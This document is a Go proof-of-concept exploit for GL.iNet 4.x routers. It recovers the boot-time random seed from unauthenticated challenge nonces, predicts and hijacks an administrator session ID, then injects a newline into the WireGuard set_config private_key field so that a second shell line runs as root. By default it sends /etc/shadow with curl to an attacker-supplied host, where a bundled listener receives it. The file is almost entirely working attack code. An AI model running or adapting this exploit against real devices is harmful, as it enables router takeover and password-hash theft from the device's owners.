// GL.iNet 4.x pre-auth session prediction -> root RCE PoC
//
// 1. unauth challenge -> 32-char nonce = 32 math.random(62) draws
// 2. math.randomseed(os.time()) at boot + musl LCG -> seed brute-forced offline
// 3. unauth alive oracle sweeps predicted sids until an admin login goes live
// 4. wg-server set_config: sprintf("echo %s | wg pubkey") + popen, newline
//    bypasses str_check_shell_injecting -> second shell line runs as root
//
// build: go build glinet-a1300-poc.go

package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"
)

const (
	user            = "root"   // challenge oracle account
	blocks          = 64       // sid candidate blocks swept per round
	predictTimeout  = 15 * time.Minute
	exfilPort       = 8080
	wgPort          = 55555    // must be a free port for set_config
	privateKeyLimit = 108      // 128-byte sprintf buffer minus "echo " + " | wg pubkey"
)

var (
	host    = flag.String("host", "192.168.8.1", "router address")
	port    = flag.Int("port", 80, "router web port (443 implies https)")
	window  = flag.Int("window", 90, "days back to brute-force the boot-time seed")
	lhost   = flag.String("lhost", "", "your address, reachable from the router (default payload exfils /etc/shadow here)")
	payload = flag.String("payload", "", "root command to run (default: exfil /etc/shadow to -lhost)")
	sidFlag = flag.String("sid", "", "existing admin sid: skip the prediction chain and only fire the payload")
)

const alphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

var httpClient = &http.Client{
	Timeout: 8 * time.Second,
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	},
}

func rpcURL() string {
	scheme := "http"
	if *port == 443 {
		scheme = "https"
	}
	return fmt.Sprintf("%s://%s:%d/rpc", scheme, *host, *port)
}

type rpcResp struct {
	Result  *json.RawMessage `json:"result"`
	Err     *struct {
		Code    int    `json:"code"`
		Message string `json:"message"`
	} `json:"error"`
}

func rpcCall(method string, params interface{}) (*rpcResp, error) {
	env := map[string]interface{}{"jsonrpc": "2.0", "id": 1, "method": method, "params": params}
	body, _ := json.Marshal(env)
	resp, err := httpClient.Post(rpcURL(), "application/json", bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(resp.Body)
	out := &rpcResp{}
	if err := json.Unmarshal(data, out); err != nil {
		s := string(data)
		if len(s) > 120 {
			s = s[:120] + "..."
		}
		return nil, fmt.Errorf("bad rpc response %q", s)
	}
	return out, nil
}

// unauth challenge: returns a nonce that is the next 32 PRNG draws.
func challengeNonce() (string, error) {
	for i := 0; i < 10; i++ {
		r, err := rpcCall("challenge", map[string]interface{}{"username": user})
		if err != nil {
			return "", err
		}
		if r.Err != nil { // nonce cap (~5 live, 2s ttl), just wait
			time.Sleep(2200 * time.Millisecond)
			continue
		}
		var res struct {
			Code int `json:"code"`
			Data struct {
				Nonce string `json:"nonce"`
			} `json:"data"`
		}
		if r.Result == nil || json.Unmarshal(*r.Result, &res) != nil || res.Code != 0 || len(res.Data.Nonce) != 32 {
			return "", fmt.Errorf("unexpected challenge response")
		}
		return res.Data.Nonce, nil
	}
	return "", fmt.Errorf("challenge oracle unavailable")
}

// unauth sid validity oracle, no rate limit, does not advance the PRNG.
func aliveOK(sid string) bool {
	r, err := rpcCall("alive", map[string]interface{}{"sid": sid})
	return err == nil && r.Err == nil
}

// musl srand/rand
type muslRand struct{ seed uint64 }

func newMusl(seed uint32) *muslRand { return &muslRand{seed: uint64(seed) - 1} }

func (m *muslRand) next() int32 {
	m.seed = 6364136223846793005*m.seed + 1
	return int32(m.seed >> 33)
}

type luaVariant int

const (
	variantFloat luaVariant = iota // idx = int(rand()/2^31 * 62) + 1
	variantModulo                  // idx = rand()%62 + 1
	variantCount
)

func (m *muslRand) draw62(v luaVariant) int {
	r := m.next()
	if v == variantFloat {
		return int(float64(uint32(r))*(1.0/2147483648.0)*62.0) + 1
	}
	return int(r)%62 + 1
}

func (m *muslRand) generateID(v luaVariant) string {
	var b strings.Builder
	for i := 0; i < 32; i++ {
		b.WriteByte(alphabet[m.draw62(v)-1])
	}
	return b.String()
}

func crackSeed(n1, n2 string) (*muslRand, luaVariant) {
	lo := time.Now().AddDate(0, 0, -*window).Unix()
	fmt.Printf("[*] brute-forcing boot-time seed (%d days back)\n", *window)
	for variant := luaVariant(0); variant < variantCount; variant++ {
		for seed := lo; seed <= time.Now().Unix(); seed++ {
			m := newMusl(uint32(seed))
			m.next() // 5.3 randomseed discards the first draw
			if m.generateID(variant) == n1 && m.generateID(variant) == n2 {
				fmt.Printf("[+] seed recovered: %d (%s), lua variant: %d\n",
					seed, time.Unix(seed, 0).Format("2006-01-02 15:04:05"), variant)
				return m, variant
			}
		}
	}
	return nil, 0
}

// sweep sid candidate blocks (block 0 is the victim's own login nonce).
func predictLoop(base *muslRand, variant luaVariant) string {
	fmt.Printf("[*] polling alive oracle for a predicted sid (%d blocks/round), stop challenging now\n", blocks)
	deadline := time.Now().Add(predictTimeout)
	var gens []string
	for round := 0; time.Now().Before(deadline); round++ {
		if round > 0 {
			time.Sleep(2 * time.Second)
		}
		for len(gens) < blocks {
			gens = append(gens, base.generateID(variant))
		}
		for j := 1; j < len(gens); j++ {
			if aliveOK(gens[j]) {
				fmt.Printf("[+] hijacked sid at block %d: %s\n", j, gens[j])
				return gens[j]
			}
		}
		if round%15 == 0 {
			fmt.Printf("    round %d: %d candidates, waiting for an admin login...\n", round, len(gens)-1)
		}
	}
	return ""
}

func runListener() {
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, req *http.Request) {
		body, _ := io.ReadAll(req.Body)
		fmt.Printf("\n[!] exfil on %s from %s (%d bytes):\n", req.URL.Path, req.RemoteAddr, len(body))
		os.Stdout.Write(body)
		fmt.Println()
		w.WriteHeader(200)
	})
	go func() {
		fmt.Printf("[*] exfil listener on 0.0.0.0:%d\n", exfilPort)
		http.ListenAndServe(fmt.Sprintf("0.0.0.0:%d", exfilPort), mux)
	}()
}

func exploit(sid string) error {
	cmd := *payload
	if cmd == "" {
		if *lhost == "" {
			return fmt.Errorf("need -lhost (exfil target) or -payload")
		}
		cmd = fmt.Sprintf("curl -m 8 -s -X POST --data-binary @/etc/shadow http://%s:%d/exfil", *lhost, exfilPort)
	}
	privateKey := "A\n" + cmd
	if len(privateKey) > privateKeyLimit {
		return fmt.Errorf("payload %d bytes exceeds the %d-byte budget", len(privateKey), privateKeyLimit)
	}
	fmt.Printf("[*] sending set_config: private_key=%q\n", privateKey)
	r, err := rpcCall("call", []interface{}{sid, "wg-server", "set_config", map[string]interface{}{
		"address_v4":  "10.0.0.1/24",
		"port":        wgPort,
		"private_key": privateKey,
	}})
	if err != nil {
		return err
	}
	if r.Err != nil {
		return fmt.Errorf("rpc error %d (%s)", r.Err.Code, r.Err.Message)
	}
	body, _ := json.Marshal(r.Result)
	b := string(body)
	switch {
	case strings.Contains(b, "rce risk"):
		return fmt.Errorf("blocked by is_rce_risk (unexpected)")
	case strings.Contains(b, "Uci file missing"):
		return fmt.Errorf("/etc/config/wireguard_server absent")
	case strings.Contains(b, "port"):
		return fmt.Errorf("port %d contested", wgPort)
	}
	// err_code 0 or -16 both mean the injected line already ran as root
	fmt.Printf("[+] command dispatched as root\n")
	return nil
}

func main() {
	flag.Parse()
	fmt.Printf("GL.iNet 4.x session prediction + root RCE PoC\ntarget: %s\n\n", rpcURL())

	if *sidFlag != "" {
		runListener()
		time.Sleep(300 * time.Millisecond)
		if err := exploit(*sidFlag); err != nil {
			fmt.Printf("[-] %v\n", err)
			os.Exit(1)
		}
		time.Sleep(3 * time.Second)
		return
	}

	fmt.Println("[*] stage 1: sampling the challenge PRNG oracle")
	n1, err := challengeNonce()
	if err != nil {
		fmt.Printf("[-] %v\n", err)
		os.Exit(1)
	}
	time.Sleep(300 * time.Millisecond)
	n2, err := challengeNonce()
	if err != nil {
		fmt.Printf("[-] %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("[+] nonce#1 = %s\n[+] nonce#2 = %s\n", n1, n2)

	m, variant := crackSeed(n1, n2)
	if m == nil {
		fmt.Println("[-] seed not found, try a bigger -window")
		os.Exit(1)
	}
	m.generateID(variant) // nonce #1
	m.generateID(variant) // nonce #2

	fmt.Println("[*] stage 2: waiting for an administrator login")
	runListener()
	sid := predictLoop(m, variant)
	if sid == "" {
		fmt.Println("[-] no predicted session went live in time")
		os.Exit(1)
	}

	fmt.Println("[*] stage 3: triggering root command injection")
	if err := exploit(sid); err != nil {
		fmt.Printf("[-] %v\n", err)
		os.Exit(1)
	}
	fmt.Println("[*] waiting for exfil...")
	time.Sleep(5 * time.Second)
}
